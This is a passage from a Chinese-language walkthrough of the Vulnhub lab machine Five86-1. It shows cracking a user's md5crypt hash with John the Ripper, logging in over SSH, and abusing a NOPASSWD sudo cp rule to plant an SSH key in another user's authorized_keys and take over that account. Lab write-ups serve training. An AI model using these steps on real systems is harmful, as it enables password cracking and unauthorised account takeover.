+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/Five86-1&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ john --format&lt;span class="o"&gt;=&lt;/span&gt;md5crypt --wordlist&lt;span class="o"&gt;=&lt;/span&gt;password.txt douglas.hash
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Using default input encoding: UTF-8
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Loaded &lt;span class="m"&gt;1&lt;/span&gt; password &lt;span class="nb"&gt;hash&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;md5crypt, crypt&lt;span class="o"&gt;(&lt;/span&gt;3&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;$1&lt;/span&gt;$ &lt;span class="o"&gt;(&lt;/span&gt;and variants&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;MD5 512/512 AVX512BW 16x3&lt;span class="o"&gt;])&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Will run &lt;span class="m"&gt;4&lt;/span&gt; OpenMP threads
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Press &lt;span class="s1"&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class="k"&gt;for&lt;/span&gt; status
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;fatherrrrr &lt;span class="o"&gt;(&lt;/span&gt;?&lt;span class="o"&gt;)&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;1g 0:00:00:48 DONE &lt;span class="o"&gt;(&lt;/span&gt;2026-10-11 03:33&lt;span class="o"&gt;)&lt;/span&gt; 0.02059g/s 447056p/s 447056c/s 447056C/s fatherefaa..fatherrtet
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Use the &lt;span class="s2"&gt;&amp;#34;--show&amp;#34;&lt;/span&gt; option to display all of the cracked passwords reliably
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Session completed. 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/Five86-1&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ john --show douglas.hash
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;?:fatherrrrr
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;1&lt;/span&gt; password &lt;span class="nb"&gt;hash&lt;/span&gt; cracked, &lt;span class="m"&gt;0&lt;/span&gt; left
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;得到密码fatherrrrr&lt;/p&gt;
+&lt;p&gt;接下来可以ssh登陆或者再之前获取的shell中切换用户&lt;/p&gt;
+&lt;h3 id="ssh登陆用户douglas"&gt;ssh登陆用户douglas
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/Five86-1&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ ssh douglas@10.10.10.103 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;The authenticity of host &lt;span class="s1"&gt;&amp;#39;10.10.10.103 (10.10.10.103)&amp;#39;&lt;/span&gt; can&lt;span class="s1"&gt;&amp;#39;t be established.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;ED25519 key fingerprint is: SHA256:c8HTcx7tPvrbA31UeXE5fRobpanfPTTHV85muCC7LpI
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;This key is not known by any other names.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;Warning: Permanently added &amp;#39;&lt;/span&gt;10.10.10.103&lt;span class="s1"&gt;&amp;#39; (ED25519) to the list of known hosts.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;** WARNING: connection is not using a post-quantum key exchange algorithm.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;** This session may be vulnerable to &amp;#34;store now, decrypt later&amp;#34; attacks.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;** The server may need to be upgraded. See https://openssh.com/pq.html
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;douglas@10.10.10.103&amp;#39;&lt;/span&gt;s password: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Linux five86-1 4.19.0-6-amd64 &lt;span class="c1"&gt;#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;The programs included with the Debian GNU/Linux system are free software&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;the exact distribution terms &lt;span class="k"&gt;for&lt;/span&gt; each program are described in the
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;individual files in /usr/share/doc/*/copyright.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;permitted by applicable law.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;douglas@five86-1:~$ id&lt;span class="p"&gt;;&lt;/span&gt;pwd&lt;span class="p"&gt;;&lt;/span&gt;whoami&lt;span class="p"&gt;;&lt;/span&gt;uname -a&lt;span class="p"&gt;;&lt;/span&gt;ls -liah
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1005&lt;span class="o"&gt;(&lt;/span&gt;douglas&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1005&lt;span class="o"&gt;(&lt;/span&gt;douglas&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1005&lt;span class="o"&gt;(&lt;/span&gt;douglas&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/home/douglas
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;douglas
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Linux five86-1 4.19.0-6-amd64 &lt;span class="c1"&gt;#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 GNU/Linux&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;total 12K
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295514&lt;/span&gt; drwx------ &lt;span class="m"&gt;3&lt;/span&gt; douglas douglas 4.0K Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;262150&lt;/span&gt; drwxr-xr-x &lt;span class="m"&gt;7&lt;/span&gt; root root 4.0K Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; ..
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;262393&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; douglas douglas &lt;span class="m"&gt;9&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; .bash_history -&amp;gt; /dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295542&lt;/span&gt; drwx------ &lt;span class="m"&gt;2&lt;/span&gt; douglas douglas 4.0K Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; .ssh
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="尝试在-douglas-用户下提权"&gt;尝试在 douglas 用户下提权
+&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;douglas@five86-1:~$ sudo -l
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Matching Defaults entries &lt;span class="k"&gt;for&lt;/span&gt; douglas on five86-1:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; env_reset, mail_badpass, &lt;span class="nv"&gt;secure_path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class="se"&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class="se"&gt;\:&lt;/span&gt;/usr/sbin&lt;span class="se"&gt;\:&lt;/span&gt;/usr/bin&lt;span class="se"&gt;\:&lt;/span&gt;/sbin&lt;span class="se"&gt;\:&lt;/span&gt;/bin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;User douglas may run the following commands on five86-1:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;(&lt;/span&gt;jen&lt;span class="o"&gt;)&lt;/span&gt; NOPASSWD: /bin/cp
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;douglas@five86-1:~$ find / -perm -4000 -type f 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/bin/newgrp
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/bin/passwd
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/bin/chsh
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/bin/su
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/bin/umount
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/bin/mount
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/bin/sudo
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/bin/gpasswd
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/bin/chfn
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/lib/eject/dmcrypt-get-device
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/lib/openssh/ssh-keysign
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/sbin/exim4
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;发现可以用jen用户的身份无密码执行/bin/cp&lt;/p&gt;
+&lt;p&gt;而且 douglas 目录下有一个隐藏目录 .ssh 我们先看看&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;span class="lnt"&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;douglas@five86-1:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; .ssh
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;douglas@five86-1:~/.ssh$ ls -liah
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;total 16K
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295542&lt;/span&gt; drwx------ &lt;span class="m"&gt;2&lt;/span&gt; douglas douglas 4.0K Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295514&lt;/span&gt; drwx------ &lt;span class="m"&gt;3&lt;/span&gt; douglas douglas 4.0K Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; ..
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;262384&lt;/span&gt; -rw------- &lt;span class="m"&gt;1&lt;/span&gt; douglas douglas 1.8K Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; id_rsa
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;262388&lt;/span&gt; -rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; douglas douglas &lt;span class="m"&gt;398&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; id_rsa.pub
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;能做什么？我们把 douglas 的公钥丢进 jen 目录，然后ssh免登陆&lt;/p&gt;
+&lt;h2 id="切换到-jen-用户"&gt;切换到 jen 用户
+&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;douglas@five86-1:~/.ssh$ cp id_rsa.pub /tmp/authorized_keys 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;douglas@five86-1:~/.ssh$ chmod &lt;span class="m"&gt;777&lt;/span&gt; /tmp/authorized_keys
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;douglas@five86-1:~/.ssh$ sudo -u jen /bin/cp /tmp/authorized_keys /home/jen/.ssh
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;douglas@five86-1:~/.ssh$ ssh jen@10.10.10.103
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Linux five86-1 4.19.0-6-amd64 &lt;span class="c1"&gt;#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;The programs included with the Debian GNU/Linux system are free software&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;the exact distribution terms &lt;span class="k"&gt;for&lt;/span&gt; each program are described in the
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;individual files in /usr/share/doc/*/copyright.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;permitted by applicable law.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;You have new mail.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;jen@five86-1:~$ 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="为什么新建的文件是这个名字呢"&gt;为什么新建的文件是这个名字呢？
+&lt;/h3&gt;&lt;p&gt;authorized_keys 不是系统自动生成的，它是 &lt;strong&gt;SSH 公钥认证&lt;/strong&gt; 用来存放“允许登录的公钥”的文件，所以当以这种方式免密登陆时，我们需要创建这个文件&lt;/p&gt;
+&lt;h3 id="查看邮箱"&gt;查看邮箱
+&lt;/h3&gt;&lt;p&gt;ssh提示有一封新邮件&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;jen@five86-1:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; /var/mail
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;jen@five86-1:/var/mail$ ls -liah
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;total 12K
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;241&lt;/span&gt; drwxrwsr-x &lt;span class="m"&gt;2&lt;/span&gt; root mail 4.0K Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;12&lt;/span&gt; drwxr-xr-x &lt;span class="m"&gt;14&lt;/span&gt; root root 4.0K Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; ..
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;6706&lt;/span&gt; -rw-rw---- &lt;span class="m"&gt;1&lt;/span&gt; jen mail &lt;span class="m"&gt;885&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; jen
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;jen@five86-1:/var/mail$ cat jen
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;From roy@five86-1 Wed Jan &lt;span class="m"&gt;01&lt;/span&gt; 03:17:00 &lt;span class="m"&gt;2020&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Return-path: &amp;lt;roy@five86-1&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Envelope-to: jen@five86-1
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Delivery-date: Wed, &lt;span class="m"&gt;01&lt;/span&gt; Jan &lt;span class="m"&gt;2020&lt;/span&gt; 03:17:00 -0500
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Received: from roy by five86-1 with &lt;span class="nb"&gt;local&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Exim 4.92&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;(&lt;/span&gt;envelope-from &amp;lt;roy@five86-1&amp;gt;&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; id 1imZBc-0001FU-El
